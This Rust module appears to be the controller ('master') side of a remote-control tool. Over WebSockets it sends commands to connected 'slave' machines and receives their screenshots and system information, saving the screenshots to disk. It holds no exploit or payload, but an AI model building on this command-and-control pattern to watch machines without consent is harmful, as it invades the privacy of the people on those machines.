use crate::common::{
    messages::{Command, Message},
    util::save_sceenshots,
};
use futures_channel::mpsc::{unbounded, UnboundedSender};
use futures_util::{future, pin_mut, stream::TryStreamExt, StreamExt};
use std::{
    collections::HashMap,
    net::SocketAddr,
    sync::{Arc, Mutex},
};
use tokio::{
    net::{TcpListener, TcpStream},
    sync::mpsc,
};
use tokio_tungstenite::{accept_async, tungstenite::protocol::Message as WsMessage};

use super::tui::app::IncomingMessage;

pub type Tx = UnboundedSender<Message>;
pub type PeerMap = Arc<Mutex<HashMap<SocketAddr, Tx>>>;

pub async fn run_master(
    addr: &str,
    app_state_tx: mpsc::Sender<IncomingMessage>,
) -> Result<PeerMap, Box<dyn std::error::Error>> {
    let state = PeerMap::new(Mutex::new(HashMap::new()));
    let listener = TcpListener::bind(addr).await?;
    // println!("Listening on: {}", addr);

    let state_clone = state.clone();
    tokio::spawn(async move {
        while let Ok((stream, addr)) = listener.accept().await {
            // Send a message about the new connection
            app_state_tx
                .send(IncomingMessage::NewConnection(addr))
                .await
                .unwrap();
            tokio::spawn(handle_connection(
                state_clone.clone(),
                stream,
                addr,
                app_state_tx.clone(),
            ));
        }
    });

    Ok(state)
}

async fn handle_connection(
    peer_map: PeerMap,
    raw_stream: TcpStream,
    addr: SocketAddr,
    app_state_tx: mpsc::Sender<IncomingMessage>,
) {
    // println!("Incoming TCP connection from: {}", addr);

    let ws_stream = accept_async(raw_stream)
        .await
        .expect("Error during the websocket handshake occurred");
    // println!("WebSocket connection established: {}", addr);

    // Create an unbounded channel for communication between the SocketAddr via WebSockets and rest of the system.
    // tx: Sender (transmitter) - Used to send messages to this specific client
    // rx: Receiver - Used to receive messages intended for this client from other parts of the system
    let (tx, rx) = unbounded();
    peer_map.lock().unwrap().insert(addr, tx);

    let (outgoing, incoming) = ws_stream.split();

    let handle_incoming = incoming.try_for_each(|msg| {
        if let WsMessage::Text(text) = msg {
            // println!("Received a message from {}: {}", addr, text);
            if let Ok(message) = serde_json::from_str::<Message>(&text) {
                handle_slave_message(addr, message, &peer_map, app_state_tx.clone());
            }
        }
        future::ok(())
    });

    let receive_from_others = rx
        .map(|msg| Ok(WsMessage::Text(serde_json::to_string(&msg).unwrap())))
        .forward(outgoing);

    pin_mut!(handle_incoming, receive_from_others);
    future::select(handle_incoming, receive_from_others).await;

    // println!("{} disconnected", &addr);
    peer_map.lock().unwrap().remove(&addr);
}

fn handle_slave_message(
    addr: SocketAddr,
    message: Message,
    _peer_map: &PeerMap,
    app_state_tx: mpsc::Sender<IncomingMessage>,
) {
    match message {
        Message::Response(response) => {
            match response {
                crate::common::messages::Response::Screens(screenshots) => {
                    save_sceenshots(screenshots.clone(), addr.to_string());
                    // println!("received some tasty screenshots, and saved them in ./slave-screenshots/ \nGo take a look!");
                    // Send the response through the channel
                    app_state_tx
                        .try_send(IncomingMessage::NewResponse(
                            addr,
                            crate::common::messages::Response::Screens(screenshots),
                        ))
                        .unwrap_or_else(|e| eprintln!("Failed to send NewResponse: {}", e));
                }
                crate::common::messages::Response::SystemInfo(system_info) => {
                    // Send the response through the channel
                    app_state_tx
                        .try_send(IncomingMessage::NewResponse(
                            addr,
                            crate::common::messages::Response::SystemInfo(system_info),
                        ))
                        .unwrap_or_else(|e| eprintln!("Failed to send NewResponse: {}", e));
                }
                crate::common::messages::Response::Status(status) => {
                    // Send the response through the channel
                    app_state_tx
                        .try_send(IncomingMessage::NewResponse(
                            addr,
                            crate::common::messages::Response::Status(status),
                        ))
                        .unwrap_or_else(|e| eprintln!("Failed to send NewResponse: {}", e));
                }
                crate::common::messages::Response::Error(error) => {
                    // Send the response through the channel
                    app_state_tx
                        .try_send(IncomingMessage::NewResponse(
                            addr,
                            crate::common::messages::Response::Error(error),
                        ))
                        .unwrap_or_else(|e| eprintln!("Failed to send NewResponse: {}", e));
                }
            }
        }
        Message::Command(_) => {
            // println!("Received unexpected command from slave {}", addr);
        }
    }
}

pub fn send_command_to_all(command: Command, peer_map: &PeerMap) {
    let message = Message::Command(command);
    let peers = peer_map.lock().unwrap();
    for (_, tx) in peers.iter() {
        let _ = tx.unbounded_send(message.clone());
        // println!("sent something to soneone...");
    }
}

pub fn send_command_to_slave(command: Command, addr: SocketAddr, peer_map: &PeerMap) -> bool {
    let message = Message::Command(command);
    let peers = peer_map.lock().unwrap();

    if let Some(tx) = peers.get(&addr) {
        tx.unbounded_send(message).is_ok()
    } else {
        false
    }
}
